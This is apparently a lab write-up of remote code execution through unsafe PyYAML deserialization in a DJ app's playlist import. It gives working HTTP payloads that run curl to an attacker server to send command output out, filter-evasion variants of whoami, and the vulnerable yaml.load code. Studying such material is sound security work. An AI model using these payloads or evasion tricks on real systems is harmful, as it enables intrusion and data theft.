<h1>Insecure Deserialization In PyYAML - FOR EDUCATIONAL PURPOSES ONLY</h1>

The application accepts regular input and YAML files when the DJ is putting in song requests. This is how the DJ manages all the songs that are played during the event. This was a bad idea because the import request
takes in data and then the backend uses PyYAML in an insecure way, allowing for a deserialization attack leading to remote code execution.

<h2>Identification</h2>

**Command Injection - curl request**

We identified the deserialization vulnerability by sending the following Proof Of Concept (POC) and noticed a request to our web server. This also verified the target server has the curl binary

```
POST /import HTTP/1.1
Host: random-tryhackme-lab-environment.com
Cookie: session=redacted
Content-Type: application/x-www-form-urlencoded
Content-Length: 92

playlist=!!python/object/apply:os.system+["curl+http://my-web-server:1337"]&playlist_file=
```

```
3 Total Target Server Interactions (I tested it 3 times) 

└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
redacted - - [17/Nov/2026 05:47:27] "GET / HTTP/1.1" 200 -
redacted - - [17/Nov/2026 05:47:41] "GET / HTTP/1.1" 200 -
redacted - - [17/Nov/2026 05:48:16] "GET / HTTP/1.1" 200 -
```

<h2>Data Exfiltration</h2>

After verifying command execution, we used curl to exfiltrate information about the file system. We used curl to run commands and send the output of the command to our server in the URL

```
POST /import HTTP/1.1
Host: random-tryhackme-lab-environment.com
Cookie: session=redacted
Content-Type: application/x-www-form-urlencoded
Content-Length: 127

playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$(ls+-la+|+base64+-w0)\""]&playlist_file=
```

**This is the data sent to our web server**

redacted - - [17/Nov/2026 06:54:16] "GET /?output=dG90YWwgMjQKZHJ3eHIteHIteCA0IGJhcnRlbmRlciAgICAgICAgYmFydGVuZGVyIDQwOTYgSnVuIDExIDEzOjAyIC4KZHJ3eHIteHIteCA1IHN5c3RlbWQtY29yZWR1bXAgdWJ1bnR1ICAgIDQwOTYgSnVuIDExIDEzOjIxIC4uCmRyd3hyLXhyLXggMiBiYXJ0ZW5kZXIgICAgICAgIGJhcnRlbmRlciA0MDk2IEp1bCAyOCAxODozNyBfX3B5Y2FjaGVfXwotcnctci0tci0tIDEgYmFydGVuZGVyICAgICAgICBiYXJ0ZW5kZXIgMjQ0NSBKdW4gMTEgMTM6MDIgYXBwLnB5Ci1ydy1yLS1yLS0gMSBiYXJ0ZW5kZXIgICAgICAgIGJhcnRlbmRlciAgIDQ0IEp1biAxMSAxMDo0NyByZXF1aXJlbWVudHMudHh0CmRyd3hyLXhyLXggMiBiYXJ0ZW5kZXIgICAgICAgIGJhcnRlbmRlciA0MDk2IEp1biAxMSAxMDo0NyB0ZW1wbGF0ZXMK HTTP/1.1" 200 -

The decoded base64 is:

```
total 24
drwxr-xr-x 4 bartender        bartender 4096 Jun 11 13:02 .
drwxr-xr-x 5 systemd-coredump ubuntu    4096 Jun 11 13:21 ..
drwxr-xr-x 2 bartender        bartender 4096 Jul 28 18:37 __pycache__
-rw-r--r-- 1 bartender        bartender 2445 Jun 11 13:02 app.py
-rw-r--r-- 1 bartender        bartender   44 Jun 11 10:47 requirements.txt
drwxr-xr-x 2 bartender        bartender 4096 Jun 11 10:47 templates
```

<h2>Obfuscation Of Our Payload</h2>

There is no WAF, so our payloads reach the target server with no restrictions, however, if there was a WAF then we would need to obfuscate our payloads. We can do so in multiple ways

**Obfuscation of the `whoami` command**

<mark>$(IFS) Empty Space</mark>

```
POST /import HTTP/1.1
Host: random-tryhackme-lab-environment.com
Cookie: session=redacted
Content-Type: application/x-www-form-urlencoded
Content-Length: 133

playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$(who$(IFS)ami+|+base64+-w0)\""]&playlist_file=
```

```
redacted - - [17/Nov/2026 07:34:28] "GET /?output=YmFydGVuZGVyCg== HTTP/1.1" 200 -
```

base64 decoded whoami output: bartender

**Obfuscation of the `whoami` command**

<mark>$() Empty Space</mark>

```
POST /import HTTP/1.1
Host: random-tryhackme-lab-environment.com
Cookie: session=redacted
Content-Type: application/x-www-form-urlencoded
Content-Length: 130

playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$(who$()ami+|+base64+-w0)\""]&playlist_file=
```

```
redacted - - [17/Nov/2026 07:41:30] "GET /?output=YmFydGVuZGVyCg== HTTP/1.1" 200 -
```

base64 decoded whoami output: bartender

**Obfuscation of the `whoami` command**

<mark>$(printf '/hex/values/for/whoami')</mark>

```
POST /import HTTP/1.1
Host: random-tryhackme-lab-environment.com
Cookie: session=redacted
Content-Type: application/x-www-form-urlencoded
Content-Length: 157

playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$($(printf+'\x77\x68\x6f\x61\x6d\x69')+|+base64+-w0)\""]&playlist_file=
```

```
redacted - - [17/Nov/2026 07:43:48] "GET /?output=YmFydGVuZGVyCg== HTTP/1.1" 200 -
```

base64 decoded whoami output: bartender

**Obfuscation of the `whoami` command**

<mark>echo 'hex-with-no-spaces' | xxd -r -p | ba$()sh</mark>

```
POST /import HTTP/1.1
Host: random-tryhackme-lab-environment.com
Cookie: session=redacted
Content-Type: application/x-www-form-urlencoded
Content-Length: 160

playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$(echo+'77686f616d69'+|+xxd+-r+-p+|ba$()sh|+base64+-w0)\""]&playlist_file=
```

```
redacted - - [17/Nov/2026 07:55:25] "GET /?output=YmFydGVuZGVyCg== HTTP/1.1" 200 -
```

base64 decoded whoami output: bartender

<h1>The Vulnerable Source Code</h1>

Using the Command Execution, we were able to read app.py, which is the dj application. Here is the vulnerable section

```
@app.route("/import", methods=["GET", "POST"])
@login_required
def import_playlist():
    result = None
    error = None
    if request.method == "POST":
        content = request.form.get("playlist", "")
        if "playlist_file" in request.files:
            f = request.files["playlist_file"]
            if f and f.filename:
                content = f.read().decode("utf-8", "replace")
        try:
            parsed = yaml.load(content, Loader=yaml.Loader)
            result = parsed
        except Exception as e:
            error = f"Could not load playlist: {e}"
    return render_template("import.html", result=result, error=error)
```

**The data being passed to yaml.load() comes directly from the user. The root cause is unsafe deserialization of attacker-controlled YAML using yaml.Loader**

**The Vulnerable Flow**

```
User-controlled YAML
       ↓
request.form / uploaded file
       ↓
content
       ↓
yaml.load(content, Loader=yaml.Loader)
       ↓
Python object construction
       ↓
Potential code execution
```




